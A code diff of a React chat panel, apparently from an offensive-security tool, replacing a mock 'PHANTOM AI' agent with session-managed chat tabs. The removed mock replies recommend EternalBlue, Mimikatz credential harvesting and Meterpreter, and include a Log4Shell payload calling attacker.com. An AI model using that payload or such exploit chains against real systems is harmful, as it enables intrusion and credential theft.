@@ -1,186 +1,196 @@
-// src/renderer/src/components/IntelPanel/AgentPanel/index.tsx
-import { useState, useRef, useEffect } from 'react'
-import { cn } from '../../../shared/lib/utils';
+// ─── Agent Panel (Main Export) ────────────────────────────────────────────
 
-// ─── Types ───────────────────────────────────────────────────────────────────
+import React, { useState, useEffect, useCallback, useRef } from 'react';
+import { MessageSquare, Cpu, Users, Settings, Plus, Sparkles, RefreshCw } from 'lucide-react';
 
-type MessageRole = 'user' | 'agent'
+import { useAgentStore } from './components/store';
+import { Chat } from './components/Chat';
+import { Models } from './components/Model';
+import { Accounts } from './components/Account';
+import { Settings as SettingsTab } from './components/Setting';
+import { loadSessions, saveSessions, createSession, updateSessionMessages } from './utils/storage';
+import { ChatSession } from './types';
+import { cn } from '@renderer/shared/lib/utils';
 
-interface Message {
-  id: string
-  role: MessageRole
-  content: string
-  ts: string
-}
+// ─── Tabs Configuration ────────────────────────────────────────────────────
 
-// ─── Mock agent responses ─────────────────────────────────────────────────────
+const TABS = [
+  { id: 'chat' as const, icon: MessageSquare, label: 'Chat' },
+  { id: 'models' as const, icon: Cpu, label: 'Models' },
+  { id: 'accounts' as const, icon: Users, label: 'Accounts' },
+  { id: 'settings' as const, icon: Settings, label: 'Settings' },
+];
 
-const AGENT_REPLIES: Record<string, string> = {
-  default: 'Analyzing target context... Based on the current scan data, I recommend focusing on the exposed SMB service (port 445) first. EternalBlue (MS17-010) remains unpatched on this host.',
-  recon:   'Running passive recon on the active sub-target. DNS enumeration shows 16 subdomains. TXT records reveal SPF and Google Workspace integration — possible phishing vector.',
-  vuln:    'Top priority: CVE-2021-44228 (Log4Shell) on port 8080. CVSS 10.0 — unauthenticated RCE. Suggested payload: `${jndi:ldap://attacker.com/exploit}` in User-Agent header.',
-  exploit: 'For the current target (Windows Server), I suggest chaining MS17-010 → Mimikatz for credential harvesting. Session upgrade to Meterpreter recommended after initial shell.',
-  help:    'Available commands:\n• `recon` — suggest recon approach\n• `vuln` — analyze top vulnerabilities\n• `exploit` — suggest exploit chain\n• `scan <target>` — initiate scan\n• `report` — generate attack summary',
-}
-
-function getMockReply(input: string): string {
-  const lower = input.toLowerCase()
-  if (lower.includes('recon') || lower.includes('osint'))    return AGENT_REPLIES.recon
-  if (lower.includes('vuln') || lower.includes('cve'))       return AGENT_REPLIES.vuln
-  if (lower.includes('exploit') || lower.includes('attack')) return AGENT_REPLIES.exploit
-  if (lower.includes('help') || lower === '?')               return AGENT_REPLIES.help
-  return AGENT_REPLIES.default
-}
-
-function now(): string {
-  return new Date().toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit' })
-}
-
-// ─── MessageBubble ────────────────────────────────────────────────────────────
-
-function MessageBubble({ msg }: { msg: Message }) {
-  const isUser = msg.role === 'user'
-  return (
-    <div className={cn('flex flex-col gap-0.5 mb-3', isUser && 'items-end')}>
-      <div className="flex items-center gap-1.5 mb-0.5">
-        {!isUser && (
-          <span className="text-[9px] font-bold text-cyan-400 uppercase tracking-wider">Agent</span>
-        )}
-        <span className="text-[9px] text-text-secondary font-mono">{msg.ts}</span>
-        {isUser && (
-          <span className="text-[9px] font-bold text-text-secondary uppercase tracking-wider">You</span>
-        )}
-      </div>
-      <div className={cn(
-        'text-[11px] leading-[1.55] px-2.5 py-2 rounded-md max-w-[92%] whitespace-pre-wrap break-words',
-        isUser
-          ? 'bg-sidebar-item-hover border border-border text-text-primary rounded-br-sm'
-          : 'bg-cyan-500/6 border border-cyan-500/15 text-text-primary rounded-bl-sm'
-      )}>
-        {msg.content}
-      </div>
-    </div>
-  )
-}
-
-// ─── AgentPanel (main export) ─────────────────────────────────────────────────
-
-const INITIAL_MESSAGES: Message[] = [
-  {
-    id: '0',
-    role: 'agent',
-    content: 'PHANTOM AI online. I have context on the active target. Ask me about recon, vulnerabilities, exploit chains, or type `help` for commands.',
-    ts: '09:41:00',
-  },
-]
+// ─── AgentPanel ────────────────────────────────────────────────────────────
 
 export function AgentPanel() {
-  const [messages, setMessages] = useState<Message[]>(INITIAL_MESSAGES)
-  const [input, setInput]       = useState('')
-  const [thinking, setThinking] = useState(false)
-  const bottomRef               = useRef<HTMLDivElement>(null)
+  const { activeTab, setActiveTab, serverStatus, activeModelId, activeAccountId } = useAgentStore();
+
+  const [sessions, setSessions] = useState<ChatSession[]>([]);
+  const [activeSessionId, setActiveSessionId] = useState<string | null>(null);
+  const [showSessionList, setShowSessionList] = useState(false);
+
+  // ─── Load sessions ─────────────────────────────────────────────────────
 
   useEffect(() => {
-    bottomRef.current?.scrollIntoView({ behavior: 'smooth' })
-  }, [messages, thinking])
+    const loaded = loadSessions();
+    setSessions(loaded);
 
-  function send() {
-    const text = input.trim()
-    if (!text || thinking) return
-
-    const userMsg: Message = { id: Date.now().toString(), role: 'user', content: text, ts: now() }
-    setMessages((m) => [...m, userMsg])
-    setInput('')
-    setThinking(true)
-
-    setTimeout(() => {
-      const reply: Message = {
-        id: (Date.now() + 1).toString(),
-        role: 'agent',
-        content: getMockReply(text),
-        ts: now(),
-      }
-      setMessages((m) => [...m, reply])
-      setThinking(false)
-    }, 800 + Math.random() * 600)
-  }
-
-  function onKey(e: React.KeyboardEvent<HTMLTextAreaElement>) {
-    if (e.key === 'Enter' && !e.shiftKey) {
-      e.preventDefault()
-      send()
+    // If no sessions, create one
+    if (loaded.length === 0) {
+      const newSession = createSession('New Chat');
+      setSessions([newSession]);
+      saveSessions([newSession]);
+      setActiveSessionId(newSession.id);
+    } else {
+      setActiveSessionId(loaded[0].id);
     }
-  }
+  }, []);
+
+  // ─── Handle session update ────────────────────────────────────────────
+
+  const handleSessionUpdate = useCallback((sessionId: string) => {
+    setSessions((prev) => {
+      const updated = prev.map((s) => (s.id === sessionId ? { ...s, updatedAt: Date.now() } : s));
+      saveSessions(updated);
+      return updated;
+    });
+  }, []);
+
+  // ─── Create new session ───────────────────────────────────────────────
+
+  const handleNewSession = useCallback(() => {
+    const newSession = createSession(`Chat ${sessions.length + 1}`);
+    setSessions((prev) => [...prev, newSession]);
+    saveSessions([...sessions, newSession]);
+    setActiveSessionId(newSession.id);
+    setShowSessionList(false);
+  }, [sessions]);
+
+  // ─── Switch session ───────────────────────────────────────────────────
+
+  const handleSwitchSession = useCallback((sessionId: string) => {
+    setActiveSessionId(sessionId);
+    setShowSessionList(false);
+  }, []);
+
+  // ─── Delete session ───────────────────────────────────────────────────
+
+  const handleDeleteSession = useCallback(
+    (sessionId: string, e: React.MouseEvent) => {
+      e.stopPropagation();
+      if (!confirm('Delete this conversation?')) return;
+
+      const filtered = sessions.filter((s) => s.id !== sessionId);
+      setSessions(filtered);
+      saveSessions(filtered);
+
+      if (activeSessionId === sessionId) {
+        if (filtered.length > 0) {
+          setActiveSessionId(filtered[0].id);
+        } else {
+          const newSession = createSession('New Chat');
+          setSessions([newSession]);
+          saveSessions([newSession]);
+          setActiveSessionId(newSession.id);
+        }
+      }
+    },
+    [sessions, activeSessionId],
+  );
+
+  // ─── Footer data ──────────────────────────────────────────────────────
+
+  const activeSession = sessions.find((s) => s.id === activeSessionId);
+  const messageCount = activeSession?.messages?.filter((m) => !m.isHidden)?.length || 0;
+
+  // ─── Render ────────────────────────────────────────────────────────────
 
   return (
-    <div className="flex flex-col overflow-hidden h-full bg-background">
-      {/* header */}
-      <div className="flex items-center gap-2 px-3 h-[38px] border-b border-divider bg-background shrink-0">
-        <svg className="w-3.5 h-3.5 text-cyan-400 shrink-0" viewBox="0 0 16 16" fill="none" stroke="currentColor" strokeWidth="1.4">
-          <rect x="2" y="3" width="12" height="10" rx="2"/>
-          <path d="M5 7h6M5 10h3"/>
-          <circle cx="12" cy="10" r="1" fill="currentColor"/>
-        </svg>
-        <span className="font-[Rajdhani,sans-serif] text-[13px] font-bold tracking-wider text-text-primary uppercase flex-1">
-          Agent Conversation
-        </span>
-        <span className="flex items-center gap-1 text-[9px] text-green-400">
-          <span className="w-1 h-1 rounded-full bg-green-400 animate-pulse" />
-          online
-        </span>
-        <span className="text-[9px] text-text-secondary font-mono">
-          {messages.length} messages
-        </span>
+    <div className="flex flex-col bg-background rounded-xl overflow-hidden shadow-2xl h-full font-sans text-text-primary">
+      {/* ─── Header ──────────────────────────────────────────────────── */}
+      <div className="flex flex-col shrink-0">
+        {/* Tab Navigation */}
+        <div className="flex items-center px-3 h-[32px] gap-1 bg-background">
+          {TABS.map(({ id, icon: Icon, label }) => (
+            <button
+              key={id}
+              onClick={() => setActiveTab(id)}
+              className={cn(
+                'flex items-center gap-1.5 px-3 py-1 rounded-md text-[11px] font-medium transition-all',
+                activeTab === id
+                  ? 'bg-cyan-500/10 text-cyan-400 border border-cyan-500/20'
+                  : 'text-text-secondary hover:text-text-primary hover:bg-card-background border border-transparent',
+              )}
+            >
+              <Icon className="w-3.5 h-3.5" />
+              {label}
+            </button>
+          ))}
+
+          <div className="flex-1" />
+
+          <span className="text-[9px] text-text-secondary font-mono">
+            {activeModelId ? `Model: ${activeModelId}` : 'No model'}
+            {activeAccountId && ' · Account: ✓'}
+          </span>
+        </div>
       </div>
 
-      {/* message list */}
-      <div className="flex-1 overflow-y-auto px-2.5 py-2.5 [&::-webkit-scrollbar]:w-[3px] [&::-webkit-scrollbar-thumb]:bg-border [&::-webkit-scrollbar-thumb]:rounded-sm">
-        {messages.map((m) => <MessageBubble key={m.id} msg={m} />)}
-
-        {thinking && (
-          <div className="flex items-center gap-2 mb-3">
-            <span className="text-[9px] font-bold text-cyan-400 uppercase tracking-wider">Agent</span>
-            <div className="flex items-center gap-1 px-2.5 py-2 bg-cyan-500/6 border border-cyan-500/15 rounded-md rounded-bl-sm">
-              <span className="w-1 h-1 bg-cyan-400 rounded-full animate-bounce" style={{ animationDelay: '0ms' }} />
-              <span className="w-1 h-1 bg-cyan-400 rounded-full animate-bounce" style={{ animationDelay: '150ms' }} />
-              <span className="w-1 h-1 bg-cyan-400 rounded-full animate-bounce" style={{ animationDelay: '300ms' }} />
+      {/* ─── Session List Dropdown ──────────────────────────────────── */}
+      {showSessionList && (
+        <div className="absolute z-20 mt-[72px] ml-4 w-64 max-h-60 overflow-y-auto bg-card-background border border-border rounded-lg shadow-2xl p-1.5">
+          {sessions.map((session) => (
+            <div
+              key={session.id}
+              onClick={() => handleSwitchSession(session.id)}
+              className={cn(
+                'flex items-center justify-between px-2.5 py-1.5 rounded-md text-xs cursor-pointer transition-all',
+                activeSessionId === session.id
+                  ? 'bg-cyan-500/10 text-cyan-400'
+                  : 'hover:bg-card-background text-text-secondary',
+              )}
+            >
+              <span className="truncate flex-1">{session.title}</span>
+              <span className="text-[9px] text-text-muted mr-2">
+                {session.messages?.filter((m) => !m.isHidden).length || 0} msgs
+              </span>
+              <button
+                onClick={(e) => handleDeleteSession(session.id, e)}
+                className="text-text-muted hover:text-red-400 transition-colors"
+              >
+                ✕
+              </button>
             </div>
-          </div>
-        )}
-        <div ref={bottomRef} />
-      </div>
-
-      {/* input */}
-      <div className="px-2.5 pb-2.5 shrink-0">
-        <div className="flex items-end gap-1.5 bg-card-background border border-border rounded-md focus-within:border-cyan-500/40 transition-colors">
-          <textarea
-            value={input}
-            onChange={(e) => setInput(e.target.value)}
-            onKeyDown={onKey}
-            placeholder="Ask agent... (Enter to send)"
-            rows={2}
-            className="flex-1 bg-transparent resize-none px-2.5 py-2 text-[11px] text-text-primary placeholder-text-secondary outline-none font-mono leading-relaxed [&::-webkit-scrollbar]:w-0"
-          />
+          ))}
           <button
-            onClick={send}
-            disabled={!input.trim() || thinking}
-            className={cn(
-              'mb-1.5 mr-1.5 w-6 h-6 rounded flex items-center justify-center transition-all shrink-0',
-              input.trim() && !thinking
-                ? 'bg-cyan-500/15 text-cyan-400 hover:bg-cyan-500/25'
-                : 'text-text-secondary cursor-not-allowed'
-            )}
+            onClick={handleNewSession}
+            className="w-full mt-1 px-2.5 py-1.5 text-xs text-cyan-400 border-t border-divider hover:bg-cyan-500/5 transition-colors flex items-center gap-1"
           >
-            <svg className="w-3.5 h-3.5" viewBox="0 0 16 16" fill="none" stroke="currentColor" strokeWidth="1.5">
-              <path d="M14 8L2 2l3 6-3 6z"/>
-            </svg>
+            <Plus className="w-3 h-3" />
+            New Chat
           </button>
         </div>
-        <div className="flex justify-between text-[8.5px] text-text-secondary mt-1 px-0.5">
-          <span>↵ send · Shift+↵ newline</span>
-          <span className="font-mono">{messages.filter(m => m.role === 'user').length} requests · {messages.filter(m => m.role === 'agent').length} responses</span>
-        </div>
+      )}
+
+      {/* ─── Content ──────────────────────────────────────────────────── */}
+      <div
+        className={cn(
+          'flex-1 overflow-hidden bg-background',
+          activeTab === 'chat' ? 'flex flex-col' : 'p-4 overflow-y-auto',
+        )}
+      >
+        {activeTab === 'chat' && (
+          <Chat
+            key={activeSessionId || 'new'}
+            conversationId={activeSessionId || ''}
+            onConversationUpdate={handleSessionUpdate}
+          />
+        )}
+        {activeTab === 'models' && <Models />}
+        {activeTab === 'accounts' && <Accounts />}
+        {activeTab === 'settings' && <SettingsTab />}
       </div>
     </div>
-  )
+  );
 }
